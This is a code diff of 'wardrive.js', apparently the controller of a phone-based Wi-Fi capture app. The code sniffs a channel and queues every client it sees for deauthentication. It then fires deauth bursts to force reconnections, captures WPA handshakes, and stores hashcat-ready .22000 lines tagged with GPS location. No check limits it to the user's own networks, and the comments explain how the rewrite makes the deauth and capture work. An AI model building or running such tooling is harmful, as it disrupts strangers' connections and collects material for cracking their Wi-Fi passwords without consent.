@@ -1,24 +1,64 @@
 // wardrive.js — Wardrive mode controller.
 //
 // States: IDLE, STARTING, CAPTURING, STOPPING
-// Uses GPS for tagging, transport for continuous capture, auto-analyzes frames
-// for AP+client associations, fires deauth bursts, and detects handshakes.
 //
-// Requires: transport, request(), Icon, log() injected via the exported API.
+// THE DATA PATH. Every bug this file has had came from misunderstanding it:
+//
+//   wardrive_start {channel}    -> the S3 locks that one channel and sniffs
+//   FT_PCAP_CONT (0x07) frames  -> ONE radiotap+802.11 frame per frame, sent
+//                                  live, handed here by app.js's decoder
+//   get_segment (polled 250ms)  -> drains the device's ring buffer. It carries
+//                                  no frames and never did — the reply is a
+//                                  count. Without the poll the ring overwrites
+//                                  itself and frames are lost silently.
+//
+// So frames do not arrive *in reply* to anything. They are pushed. This file is
+// therefore an ingest, not a fetch loop, and the poll's only job is to keep the
+// device's ring moving.
+//
+// Parsing is delegated: analyze.js's parseChunk for the 802.11 layer (including
+// the radiotap strip and the QoS-aware payload offset) and crack.js's
+// parseEapolKey / roles / extractHandshakes for EAPOL. There is deliberately no
+// second implementation of either here — a hand-rolled one was what broke this
+// mode: it read frame control from offset 0 of a radiotap-prefixed frame, so no
+// beacon and no data frame could ever match, and its deauth never fired.
+//
+// Requires: request, log, icon, gps, hashStore injected via init().
 // Mounted to window.Wardrive.
+
+import { parseChunk } from './analyze.js';
+import { roles, parseEapolKey, extractHandshakes } from './crack.js';
 
 (function () {
   'use strict';
 
   const STATE = { IDLE: 'IDLE', STARTING: 'STARTING', CAPTURING: 'CAPTURING', STOPPING: 'STOPPING' };
 
+  // How many frames to retain for the sweep at stop(). An M1..M4 exchange ends
+  // within a few frames of the deauth, so this is far deeper than reachable —
+  // it bounds memory on a phone that walks for hours.
+  const KEEP_CHUNKS = 20000;
+  // Per-pair history, for extracting a hash the moment its M2 lands.
+  const KEEP_PAIR_CHUNKS = 64;
+  // One target at a time. The ring refills faster than this on a busy channel.
+  const DEAUTH_INTERVAL_MS = 500;
+
   // In-memory maps for seen APs and associated clients
-  let seenAPs = new Map();   // bssid -> {ssid, channel, frames, clients: Set<mac>}
-  let deauthQueue = [];      // [{bssid, client}]
+  let seenAPs = new Map();       // bssid -> {ssid, channel, frames, clients: Set<mac>}
+  let deauthQueue = [];          // [{bssid, client}]
   let lastDeauthTime = 0;
   let handshakeCount = 0;
+  let eapolFrames = 0;
   let frameCount = 0;
+  let unparsedCount = 0;
   let deauthCount = 0;
+  let deauthErrors = 0;
+  let lastDeauthError = null;
+  let chunks = [];               // bounded ring, swept at stop()
+  let pairChunks = new Map();    // "bssid|client" -> bounded chunk list
+  let beaconChunks = new Map();  // bssid -> the beacon that named it (the salt)
+  let storedHashes = new Set();  // "bssid|client|type" already written
+  let channel = 6;
   let state = STATE.IDLE;
 
   // Injected dependencies
@@ -31,6 +71,7 @@
   // UI element references (set during init)
   let $wardriveBtn = null;
   let $wardriveStatus = null;
+  let $wardriveChannel = null;
   let $gpsStatus = null;
   let $wFrames = null;
   let $wAPs = null;
@@ -47,7 +88,7 @@
 
   /**
    * Set up UI references and bind button handlers.
-   * deps: { request, log, icon }
+   * deps: { request, log, icon, gps, hashStore }
    */
   function init(deps) {
     _request = deps.request;
@@ -58,6 +99,7 @@
 
     $wardriveBtn = document.getElementById('wardriveBtn');
     $wardriveStatus = document.getElementById('wardriveStatus');
+    $wardriveChannel = document.getElementById('wardriveChannel');
     $gpsStatus = document.getElementById('gpsStatus');
     $wFrames = document.getElementById('wFrames');
     $wAPs = document.getElementById('wAPs');
@@ -87,40 +129,68 @@
     return state;
   }
 
+  /** The channel to lock, from the card's field. Falls back to 6. */
+  function readChannel() {
+    const v = $wardriveChannel ? parseInt($wardriveChannel.value, 10) : NaN;
+    return Number.isFinite(v) && v >= 1 && v <= 196 ? v : 6;
+  }
+
+  /** GPS fixes arrive with the position object as their only argument. */
+  function onGpsUpdate() {
+    updateUI();
+  }
+
   // ── start / stop ─────────────────────────────────────────────────────────────
 
   async function start() {
     if (state !== STATE.IDLE) return;
     state = STATE.STARTING;
     updateUI();
-    logWardrive('Starting wardrive…');
+
+    channel = readChannel();
+    resetStats();
+    logWardrive('Starting wardrive on channel ' + channel + '…');
 
     try {
-      // 1. Start GPS
-      _gps.startTracking(onGpsUpdate);
+      // 1. GPS first: every stored handshake is tagged with where it was found.
+      if (_gps && typeof _gps.startTracking === 'function') _gps.startTracking(onGpsUpdate);
 
-      // 2. Send start_cont_capture command
-      if (_request) {
-        const resp = await _request('START_CONT_CAPTURE', undefined, { timeoutMs: 5000 });
-        if (!resp || !resp.ok) {
-          throw new Error(resp?.error || 'board refused continuous capture');
-        }
-        logWardrive('Continuous capture started');
+      // 2. Lock the channel and start sniffing. This is the command that puts
+      //    the device into its capturing state — get_segment is refused without
+      //    it, which is why it has to be this one and not a generic capture call.
+      if (!_request) throw new Error('no link to the board');
+      const resp = await _request('wardrive_start', { channel }, { timeoutMs: 5000 });
+      if (!resp) {
+        // A reply that never parsed is NOT a refusal. The old wording here
+        // ("board refused") sent us hunting the firmware for a day while the
+        // app's own decoder was splicing the reply at a USB packet boundary —
+        // see tools/verify_transport.mjs.
+        throw new Error('no parsable reply to wardrive_start (protocol error, not a refusal)');
+      }
+      if (resp.ok !== true) {
+        const msg = resp.error || 'board refused wardrive_start';
+        // "already running" is the state we asked for, not a failure. A start
+        // whose reply was lost (or a previous session) leaves the board
+        // capturing with the app sitting at IDLE — and the app cannot stop what
+        // it does not know about, so it refuses to do anything ever again.
+        // Adopt the running session and drain it instead.
+        if (!/already running/i.test(msg)) throw new Error(msg);
+        logWardrive('Board was already capturing — adopting the running session');
+      } else {
+        logWardrive('Capturing on channel ' + channel);
       }
 
-      // 3. Begin poll loop
+      // 3. Begin the drain loop. Frames arrive on their own from here.
       state = STATE.CAPTURING;
       startTime = Date.now();
-      resetStats();
       startSessionTimer();
       pollLoop();
       updateUI();
-      if (_log) _log('ev', 'wardrive started');
+      if (_log) _log('ev', 'wardrive started on channel ' + channel);
     } catch (e) {
       logWardrive('Error: ' + e.message);
       if (_log) _log('err', 'wardrive start: ' + e.message);
-      // Clean up GPS
-      _gps.stopTracking();
+      if (_gps && typeof _gps.stopTracking === 'function') _gps.stopTracking();
       state = STATE.IDLE;
       updateUI();
     }
@@ -132,7 +202,7 @@
     updateUI();
     logWardrive('Stopping wardrive…');
 
-    // 1. Stop poll loop
+    // 1. Stop the poll loop
     if (pollTimer) {
       clearTimeout(pollTimer);
       pollTimer = null;
@@ -142,241 +212,311 @@
       sessionDurationTimer = null;
     }
 
-    // 2. Send stop_cont_capture
+    // 2. Take the radio out of capturing state
     try {
       if (_request) {
-        const resp = await _request('STOP_CONT_CAPTURE', undefined, { timeoutMs: 3000 });
-        if (resp && _log) _log('ev', 'wardrive: continuous capture stopped');
+        const resp = await _request('wardrive_stop', undefined, { timeoutMs: 3000 });
+        if (resp && resp.ok) logWardrive('Capture stopped on the board');
+        else if (resp) logWardrive('stop: ' + (resp.error || 'board refused'));
       }
     } catch (e) {
       if (_log) _log('err', 'wardrive stop: ' + e.message);
     }
 
     // 3. Stop GPS
-    _gps.stopTracking();
+    if (_gps && typeof _gps.stopTracking === 'function') _gps.stopTracking();
 
-    // 4. Save session via HashStore
-    const sessionId = _hashStore.getCurrentSession();
-    logWardrive('Session saved: ' + sessionId);
+    // 3b. Drain whatever is still queued: the tail sweep can only see frames that
+    //     have been parsed, and a ring flush can leave thousands still waiting.
+    if (ingestTimer) { clearTimeout(ingestTimer); ingestTimer = null; }
+    const stillQueued = ingestQueue.splice(0, ingestQueue.length);
+    for (const c of stillQueued) ingestFrame(c);
+    if (stillQueued.length) logWardrive('Drained ' + stillQueued.length + ' queued frame(s) before the tail sweep');
+    if (ingestDropped) logWardrive('Ingest dropped ' + ingestDropped + ' frame(s) this session');
 
-    // 5. Show export dialog
+    // 4. Final sweep: a handshake whose M1 and M2 straddled the tail of the
+    //    session is only visible over the whole ring.
+    const added = extractOver(chunks);
+    if (added) logWardrive('Tail sweep: ' + added + ' more handshake(s)');
+
+    const sessionId = _hashStore ? _hashStore.getCurrentSession() : null;
+    logWardrive('Session ' + (sessionId || '(none)') + ': ' + frameCount + ' frames, ' +
+      seenAPs.size + ' APs, ' + handshakeCount + ' handshakes');
     showExportDialog(sessionId);
 
     state = STATE.IDLE;
     updateUI();
-    if (_log) _log('ev', 'wardrive stopped — ' + frameCount + ' frames, ' + handshakeCount + ' handshakes');
+    if (_log) {
+      _log('ev', 'wardrive stopped — ' + frameCount + ' frames, ' + handshakeCount +
+        ' handshakes, ' + deauthCount + ' deauths' +
+        (deauthErrors ? ', ' + deauthErrors + ' deauth errors' : ''));
+    }
   }
 
   // ── poll loop ────────────────────────────────────────────────────────────────
 
+  /**
+   * Drain the device's ring, then service the deauth queue.
+   *
+   * The frames are NOT in this reply. get_segment returns a count; the frames
+   * come in separately as FT_PCAP_CONT and are handled by onSegmentChunk.
+   */
   async function pollLoop() {
     if (state !== STATE.CAPTURING) return;
 
     try {
-      if (!_request) return;
-
-      // 1. Send get_segment command
-      const resp = await _request('GET_SEGMENT', undefined, { timeoutMs: 2000 });
-
-      if (resp && resp.segment) {
-        // Parse returned PCAP frames
-        const frames = parseSegment(resp.segment);
-        if (frames.length > 0) {
-          frameCount += frames.length;
-          await autoAnalyze(frames);
+      if (_request) {
+        const resp = await _request('GET_SEGMENT', undefined, { timeoutMs: 2000 });
+        if (resp && resp.ok === false && /wardrive|not capturing/i.test(resp.error || '')) {
+          // The device is not in capturing state, so nothing can arrive and the
+          // silence is the failure. Say so rather than loop forever quietly.
+          logWardrive('Board is not capturing (' + resp.error + ') — stopping.');
+          if (_log) _log('err', 'wardrive: ' + resp.error);
+          stop();
+          return;
         }
       }
 
-      // 2. Auto deauth
       await autoDeauth();
-
     } catch (e) {
-      // Link busy or timed out — normal during heavy capture
-      if (e.message && e.message.includes('timed out')) {
-        // expected occasionally
-      }
+      // A timeout while the radio is mid-burst is normal. Anything else is worth
+      // one line, because swallowed errors are how this mode stayed broken.
+      if (!/timed out/.test(e.message || '')) logWardrive('poll: ' + e.message);
     }
 
     updateUI();
 
-    // Schedule next poll
     if (state === STATE.CAPTURING) {
       pollTimer = setTimeout(pollLoop, 250);
     }
   }
 
-  // ── segment parsing ──────────────────────────────────────────────────────────
+  // ── ingest ───────────────────────────────────────────────────────────────────
+
+  // Bounded ingest. app.js's decoder calls onSegmentChunk FROM THE USB DATA
+  // HANDLER, and a device flushing a stale ring hands us tens of thousands of
+  // frames back-to-back. Parsing each one inline — and repainting per frame —
+  // saturates the renderer: the UI stops repainting, CDP stops answering, and
+  // adbd dies with it. So this handler only queues; ingestTick() parses a bounded
+  // slice and yields, which keeps the WebView alive through any backlog.
+  const INGEST_QUEUE_MAX = 4000;   // frames held before the OLDEST are dropped
+  const INGEST_PER_TICK = 250;     // frames parsed per slice
+  let ingestQueue = [];
+  let ingestTimer = null;
+  let ingestDropped = 0;
+  let ingestDropLoggedAt = 0;
 
   /**
-   * Parse a raw segment (base64 or Uint8Array) into individual frame bytes.
-   * The segment from the board is raw 802.11 frames concatenated.
-   * We split on retry limit — for this implementation, treat the whole segment
-   * as one frame blob and analyze it.
-   * Returns array of Uint8Array frames.
+   * One radiotap+802.11 frame, straight off an FT_PCAP_CONT message.
+   *
+   * Public: app.js's decoder calls this. Exactly one frame per call — the device
+   * frames them itself, so there is nothing to split.
+   *
+   * It MUST NOT parse: this runs on the USB data path, so it only queues.
    */
-  function parseSegment(segment) {
-    if (!segment) return [];
-    // segment is an object from JSON — could be hex, base64, or {data, len}
-    let bytes;
-    if (typeof segment === 'string') {
-      // Might be hex string or base64
-      if (/^[0-9a-fA-F]+$/.test(segment)) {
-        bytes = hexToBytes(segment);
-      } else {
-        // Base64
-        try {
-          bytes = base64ToBytes(segment);
-        } catch {
-          return [];
-        }
-      }
-    } else if (segment.data && typeof segment.data === 'string') {
-      bytes = base64ToBytes(segment.data);
-    } else if (segment instanceof Array) {
-      bytes = new Uint8Array(segment);
-    } else {
-      return [];
+  function onSegmentChunk(chunk) {
+    if (state !== STATE.CAPTURING && state !== STATE.STOPPING) return;
+    ingestQueue.push(chunk);
+    if (ingestQueue.length > INGEST_QUEUE_MAX) {
+      // The backlog is stale by definition — keep the newest frames and count
+      // what was thrown away. Silent dropping is how this mode got its reputation.
+      ingestDropped += ingestQueue.length - INGEST_QUEUE_MAX;
+      ingestQueue.splice(0, ingestQueue.length - INGEST_QUEUE_MAX);
     }
-
-    if (!bytes || bytes.length < 24) return [];
-
-    // Simple split: if we have multiple frames concatenated, separate by
-    // frame control fields. Each 802.11 frame starts with a 2-byte Frame
-    // Control, and minimum frame size is 24 bytes.
-    const frames = [];
-    let offset = 0;
-    while (offset + 24 <= bytes.length) {
-      // Try to determine the frame length from the Length field in
-      // radiotap header if present, or just take available data
-      const frameLen = Math.min(1500, bytes.length - offset);
-      frames.push(bytes.slice(offset, offset + frameLen));
-      offset += frameLen;
-    }
-    return frames;
+    if (!ingestTimer) ingestTimer = setTimeout(ingestTick, 0);
   }
 
-  // ── auto analyze ─────────────────────────────────────────────────────────────
-
-  async function autoAnalyze(frames) {
-    for (const frameBytes of frames) {
-      if (frameBytes.length < 24) continue;
-
-      const frameControl = (frameBytes[0] << 8) | frameBytes[1];
-      const type = (frameControl >> 2) & 0x03;
-      const subtype = (frameControl >> 4) & 0x0f;
-
-      // Extract MAC addresses
-      // addr1 = receiver (offset 4-10), addr2 = transmitter (offset 10-16), addr3 = (offset 16-22)
-      const addr2 = macFromBytes(frameBytes, 10);  // transmitter
-      const addr1 = macFromBytes(frameBytes, 4);   // receiver
-      const addr3 = macFromBytes(frameBytes, 16);  // BSSID for some frames
-
-      if (!addr2) continue;
-
-      if (type === 0) {
-        // Management frames
-        if (subtype === 8) {
-          // Beacon — addr3 is BSSID
-          const bssid = addr3 || addr2;
-          const ssid = extractSSID(frameBytes);
-          const channel = extractChannel(frameBytes);
-          if (!seenAPs.has(bssid)) {
-            seenAPs.set(bssid, { ssid, channel, frames: 0, clients: new Set() });
-          }
-          const ap = seenAPs.get(bssid);
-          ap.frames++;
-          if (ssid) ap.ssid = ssid;
-          if (channel) ap.channel = channel;
-        }
-      } else if (type === 1) {
-        // Control frames
-        if (subtype === 10 || subtype === 12) {
-          // PS-Poll / CF-End — not interesting for deauth
-        }
-      } else if (type === 2) {
-        // Data frames
-        // addr1 = receiver (often the AP or client)
-        // addr2 = transmitter
-        const bssid = addr3 || addr2;
-        const client = addr1;
-
-        if (bssid && client && bssid !== client && bssid !== 'ff:ff:ff:ff:ff:ff') {
-          if (!seenAPs.has(bssid)) {
-            seenAPs.set(bssid, { ssid: null, channel: null, frames: 0, clients: new Set() });
-          }
-          const ap = seenAPs.get(bssid);
-          ap.frames++;
-
-          // Check for new association (client not yet seen on this AP)
-          if (!ap.clients.has(client) && client !== 'ff:ff:ff:ff:ff:ff') {
-            ap.clients.add(client);
-            // Queue for deauth
-            deauthQueue.push({ bssid, client });
-          }
-        }
-
-        // Handshake detection (EAPOL — EtherType 0x888E)
-        const etherType = (frameBytes[24] << 8) | frameBytes[25];
-        if (etherType === 0x888E) {
-          handshakeCount++;
-          // EAPOL frame found — save the raw segment bytes
-          // The .22000 extraction is done offline from the pcap
-          logWardrive('Handshake detected! (' + bssid + ')');
-
-          // Also store a hash placeholder in HashStore
-          const gps = _gps && _gps.position;
-          const ap = seenAPs.get(bssid);
-          _hashStore.addHash(
-            'HANDSHAKE_' + bssid.replace(/:/g, ''),
-            bssid,
-            ap?.ssid || '(unknown)',
-            ap?.channel || 0,
-            gps?.lat || null,
-            gps?.lon || null,
-            gps?.accuracy || null
-          );
-        }
-      }
+  /** Parse one bounded slice, repaint once, then yield back to the event loop. */
+  function ingestTick() {
+    ingestTimer = null;
+    const batch = ingestQueue.splice(0, INGEST_PER_TICK);
+    for (const chunk of batch) ingestFrame(chunk);
+    updateUI();
+    if (ingestDropped && Date.now() - ingestDropLoggedAt > 2000) {
+      ingestDropLoggedAt = Date.now();
+      logWardrive('INGEST dropped ' + ingestDropped + ' frame(s) — backlog exceeded ' +
+        INGEST_QUEUE_MAX + ' (the ring flushed faster than frames parse)');
     }
+    if (ingestQueue.length && (state === STATE.CAPTURING || state === STATE.STOPPING)) {
+      ingestTimer = setTimeout(ingestTick, 0);
+    }
+  }
+
+  /** Parse exactly ONE frame. Called by ingestTick() and stop()'s flush only. */
+  function ingestFrame(chunk) {
+    if (!chunk || chunk.length < 24) { unparsedCount++; return; }
+
+    const f = parseChunk(chunk);
+    if (!f) { unparsedCount++; return; }
+    frameCount++;
+    remember(chunk);
+
+    // ── APs, from beacons and probe responses (BSSID is addr3) ────────────────
+    if (f.type === 'mgmt' && (f.subtype === 'beacon' || f.subtype === 'probe-resp')) {
+      const bssid = f.addr3;
+      if (!bssid) return;
+      const ap = noteAP(bssid, f.ssid, f.channel);
+      ap.frames++;
+      // Keep the beacon: it carries the SSID bytes, and the SSID is the salt in
+      // the .22000 line. No beacon, no crackable hash — crack.js reports that as
+      // an "incomplete" with reason no-essid.
+      if (!beaconChunks.has(bssid)) beaconChunks.set(bssid, chunk);
+      if (ap.ssid && !ap.logged) {
+        ap.logged = true;
+        logWardrive('AP ' + bssid + ' "' + ap.ssid + '" ch' + (ap.channel ?? '?'));
+      }
+      return;
+    }
+
+    if (f.type !== 'data') return;
+
+    // ── Clients, and therefore deauth targets ─────────────────────────────────
+    const { client, bssid } = roles(f);
+    if (!bssid || !client) return;              // WDS/ambiguous: skip, per crack.js
+    if (isMulticast(client) || isBroadcast(bssid)) return;
+
+    const ap = noteAP(bssid, null, f.channel);
+    ap.frames++;
+    if (!ap.clients.has(client)) {
+      ap.clients.add(client);
+      deauthQueue.push({ bssid, client });
+      logWardrive('Target ' + client + ' on ' + bssid);
+    }
+
+    // ── EAPOL: the whole point ────────────────────────────────────────────────
+    // The offset has to come from parseChunk: a data frame's body does not start
+    // at a fixed offset once QoS control is present.
+    const eap = parseEapolKey(chunk, f.payloadOff);
+    if (!eap) return;
+
+    eapolFrames++;
+    const key = bssid + '|' + client;
+    if (!pairChunks.has(key)) pairChunks.set(key, []);
+    const hist = pairChunks.get(key);
+    hist.push(chunk);
+    if (hist.length > KEEP_PAIR_CHUNKS) hist.shift();
+
+    logWardrive('EAPOL M' + eap.message + ' ' + client + ' <-> ' + bssid);
+
+    // Try immediately: an M2 arriving after its M1 completes a crackable pair,
+    // and the ANonce is in the history either way.
+    extractOver(pairHistory(bssid, key));
+    // No repaint here: ingestTick() paints once per slice, and painting per frame
+    // is half of what took the UI down with a ring flush.
+  }
+
+  function remember(chunk) {
+    chunks.push(chunk);
+    if (chunks.length > KEEP_CHUNKS) chunks.shift();
+  }
+
+  /** The beacon that named this BSSID, plus the exchanges seen on this pair. */
+  function pairHistory(bssid, key) {
+    const out = [];
+    const b = beaconChunks.get(bssid);
+    if (b) out.push(b);
+    const hist = pairChunks.get(key);
+    if (hist) out.push(...hist);
+    return out;
+  }
+
+  // ── hash extraction ──────────────────────────────────────────────────────────
+
+  /**
+   * Extract hashes from a chunk list and write new ones to HashStore.
+   *
+   * Stores the real .22000 line that crack.js builds — never a placeholder. The
+   * old code wrote a made-up string into the hash field, so the export produced
+   * a .22000 file that hashcat could not read a single line of.
+   *
+   * Returns how many hashes were newly stored.
+   */
+  function extractOver(list) {
+    if (!list || !list.length) return 0;
+
+    let res;
+    try {
+      res = extractHandshakes(list);
+    } catch (e) {
+      if (_log) _log('err', 'wardrive extract: ' + e.message);
+      return 0;
+    }
+
+    const gps = _gps && _gps.position;
+    let added = 0;
+    for (const h of res.handshakes) {
+      const key = h.bssid + '|' + h.client + '|' + h.type;
+      if (storedHashes.has(key)) continue;
+      storedHashes.add(key);
+
+      const ap = seenAPs.get(h.bssid);
+      if (_hashStore) {
+        _hashStore.addHash(
+          h.line,
+          h.bssid,
+          h.essid || ap?.ssid || '(unknown)',
+          ap?.channel ?? channel,
+          gps?.lat ?? null,
+          gps?.lon ?? null,
+          gps?.accuracy ?? null
+        );
+      }
+      handshakeCount++;
+      added++;
+      logWardrive('Handshake stored: ' + h.bssid + ' (' + h.type + ': ' +
+        (h.messages || []).join('+') + ')');
+    }
+
+    // An exchange seen but unusable is worth saying out loud, because the usual
+    // cause is a missing beacon — i.e. the deauth worked and the salt did not.
+    for (const inc of res.incomplete || []) {
+      const key = 'inc|' + inc.bssid + '|' + inc.client + '|' + inc.reason;
+      if (storedHashes.has(key)) continue;
+      storedHashes.add(key);
+      logWardrive('Exchange unusable (' + inc.reason + '): ' + inc.bssid);
+    }
+
+    return added;
   }
 
   // ── auto deauth ──────────────────────────────────────────────────────────────
 
   async function autoDeauth() {
-    const now = Date.now();
     if (deauthQueue.length === 0) return;
-    if (now - lastDeauthTime < 500) return;
+
+    const now = Date.now();
+    if (now - lastDeauthTime < DEAUTH_INTERVAL_MS) return;
 
     const target = deauthQueue.shift();
-    if (!target) return;
+    if (!target || !_request) return;
+
+    const hexBssid = target.bssid.replace(/:/g, '');
+    const hexClient = target.client.replace(/:/g, '');
 
     try {
-      if (!_request) return;
-
-      // Build deauth frames for BSSID -> client
-      const hexBssid = target.bssid.replace(/:/g, '');
-      const hexClient = target.client.replace(/:/g, '');
-
-      const resp = await _request('DEAUTH_NOW', {
+      const resp = await _request('deauth_now', {
         bssid: hexBssid,
         client: hexClient,
+        count: 5,
+        interval_ms: 100,
       }, { timeoutMs: 2000 });
 
       if (resp && resp.ok) {
         deauthCount++;
         lastDeauthTime = now;
-        logWardrive('Deauth: ' + target.bssid + ' -> ' + target.client);
+        logWardrive('Deauth ' + target.client + ' <- ' + target.bssid);
+      } else {
+        // Counted and logged, not swallowed: a refused deauth is the difference
+        // between a recorder and a deauther, and silence here hid that.
+        deauthErrors++;
+        lastDeauthError = resp?.error || 'refused';
+        logWardrive('Deauth refused: ' + lastDeauthError);
       }
     } catch (e) {
-      // Transmit may fail — not critical
+      deauthErrors++;
+      lastDeauthError = e.message;
+      logWardrive('Deauth failed: ' + e.message);
     }
-  }
-
-  // ── handshake detection ─────────────────────────────────────────────────────
-
-  function handshakeDetect(frameBytes) {
-    // Already handled inline in autoAnalyze
-    return null;
   }
 
   // ── UI updates ───────────────────────────────────────────────────────────────
@@ -386,9 +526,11 @@
       if (state === STATE.IDLE) {
         $wardriveBtn.textContent = 'Start Wardrive';
         $wardriveBtn.className = '';
+        $wardriveBtn.disabled = false;
       } else if (state === STATE.CAPTURING) {
         $wardriveBtn.textContent = 'Stop Wardrive';
         $wardriveBtn.className = 'danger';
+        $wardriveBtn.disabled = false;
       } else {
         $wardriveBtn.textContent = state;
         $wardriveBtn.disabled = true;
@@ -402,7 +544,8 @@
     if ($gpsStatus) {
       const gps = _gps && _gps.position;
       if (gps && gps.lat != null) {
-        $gpsStatus.textContent = gps.lat.toFixed(5) + ', ' + gps.lon.toFixed(5) + ' ±' + (gps.accuracy != null ? gps.accuracy.toFixed(0) + 'm' : '?');
+        $gpsStatus.textContent = gps.lat.toFixed(5) + ', ' + gps.lon.toFixed(5) +
+          ' ±' + (gps.accuracy != null ? gps.accuracy.toFixed(0) + 'm' : '?');
         $gpsStatus.style.color = 'var(--ok)';
       } else {
         $gpsStatus.textContent = 'no fix';
@@ -412,7 +555,7 @@
 
     if ($wFrames) $wFrames.textContent = frameCount;
     if ($wAPs) $wAPs.textContent = seenAPs.size;
-    if ($wDeauths) $wDeauths.textContent = deauthCount;
+    if ($wDeauths) $wDeauths.textContent = deauthCount + (deauthErrors ? ' (' + deauthErrors + ' failed)' : '');
     if ($wHandshakes) $wHandshakes.textContent = handshakeCount;
   }
 
@@ -438,19 +581,34 @@
   function resetStats() {
     seenAPs = new Map();
     deauthQueue = [];
+    chunks = [];
+    pairChunks = new Map();
+    beaconChunks = new Map();
+    storedHashes = new Set();
     handshakeCount = 0;
+    eapolFrames = 0;
     frameCount = 0;
+    unparsedCount = 0;
     deauthCount = 0;
+    deauthErrors = 0;
+    lastDeauthError = null;
+    lastDeauthTime = 0;
+    ingestQueue = [];
+    if (ingestTimer) { clearTimeout(ingestTimer); ingestTimer = null; }
+    ingestDropped = 0;
+    ingestDropLoggedAt = 0;
   }
 
   // ── export dialog ────────────────────────────────────────────────────────────
 
   function showExportDialog(sessionId) {
-    const hasJSON = _hashStore.getSession(sessionId).length > 0;
+    if (!_hashStore || !sessionId) return;
+
+    const records = _hashStore.getSession(sessionId) || [];
+    const hasJSON = records.length > 0;
     const has22000 = _hashStore.export22000(sessionId).length > 0;
 
-    logWardrive('Session ' + sessionId + ': ' +
-      _hashStore.getSession(sessionId).length + ' records. ' +
+    logWardrive('Session ' + sessionId + ': ' + records.length + ' records. ' +
       (has22000 ? '22000 export available.' : 'No handshakes captured.'));
 
     // Simple export UI appended to wardrive log area
@@ -498,58 +656,58 @@
 
   // ── helpers ──────────────────────────────────────────────────────────────────
 
-  function macFromBytes(bytes, offset) {
-    if (offset + 6 > bytes.length) return null;
-    return Array.from(bytes.subarray(offset, offset + 6))
-      .map((b) => b.toString(16).padStart(2, '0'))
-      .join(':')
-      .toLowerCase();
-  }
-
-  function extractSSID(bytes) {
-    // Look for SSID parameter element: tag 0x00, then length, then SSID chars
-    // Start after fixed header (24 bytes) + optional HT control (4 bytes if QoS)
-    const off = 24; // skip fixed 802.11 header
-    let i = off;
-    while (i + 1 < bytes.length) {
-      const tag = bytes[i];
-      const len = bytes[i + 1];
-      if (tag === 0x00 && len > 0 && i + 2 + len <= bytes.length) {
-        return new TextDecoder().decode(bytes.subarray(i + 2, i + 2 + len));
-      }
-      i += 2 + len;
+  function noteAP(bssid, ssid, ch) {
+    if (!seenAPs.has(bssid)) {
+      seenAPs.set(bssid, { ssid: null, channel: null, frames: 0, clients: new Set() });
     }
-    return null;
+    const ap = seenAPs.get(bssid);
+    if (ssid && ssid !== ap.ssid) ap.ssid = ssid;
+    if (ch && ch !== ap.channel) ap.channel = ch;
+    return ap;
   }
 
-  function extractChannel(bytes) {
-    // Look for DS parameter set element: tag 0x03, len 1, channel
-    const off = 24;
-    let i = off;
-    while (i + 1 < bytes.length) {
-      const tag = bytes[i];
-      const len = bytes[i + 1];
-      if (tag === 0x03 && len === 1 && i + 3 <= bytes.length) {
-        return bytes[i + 2];
-      }
-      i += 2 + len;
-    }
-    return null;
+  function isBroadcast(mac) {
+    return !mac || mac === 'ff:ff:ff:ff:ff:ff';
   }
 
-  function hexToBytes(hex) {
-    const bytes = new Uint8Array(hex.length / 2);
-    for (let i = 0; i < bytes.length; i++) {
-      bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
-    }
-    return bytes;
+  /** The group bit. A multicast "client" is not a station and cannot be deauthed. */
+  function isMulticast(mac) {
+    if (!mac) return true;
+    const first = parseInt(mac.slice(0, 2), 16);
+    return Number.isFinite(first) && (first & 1) === 1;
   }
 
-  function base64ToBytes(b64) {
-    const s = atob(b64);
-    const bytes = new Uint8Array(s.length);
-    for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);
-    return bytes;
+  // ── test surface ─────────────────────────────────────────────────────────────
+
+  /**
+   * Counters and inventory, for tools/verify_wardrive.mjs.
+   *
+   * The counters are the assertions: a mode that reports 0 frames, 0 APs and 0
+   * deauths while frames are plainly on the wire is the bug shape this exposes.
+   */
+  function getStats() {
+    return {
+      state,
+      channel,
+      frameCount,
+      unparsedCount,
+      eapolFrames,
+      handshakeCount,
+      deauthCount,
+      deauthErrors,
+      lastDeauthError,
+      queued: deauthQueue.length,
+      ingestQueued: ingestQueue.length,
+      ingestDropped,
+      aps: seenAPs.size,
+      seen: [...seenAPs.entries()].map(([bssid, ap]) => ({
+        bssid,
+        ssid: ap.ssid,
+        channel: ap.channel,
+        frames: ap.frames,
+        clients: [...ap.clients],
+      })),
+    };
   }
 
   // ── public API ───────────────────────────────────────────────────────────────
@@ -560,5 +718,7 @@
     stop,
     isRunning,
     getState,
+    onSegmentChunk,
+    getStats,
   };
 })();
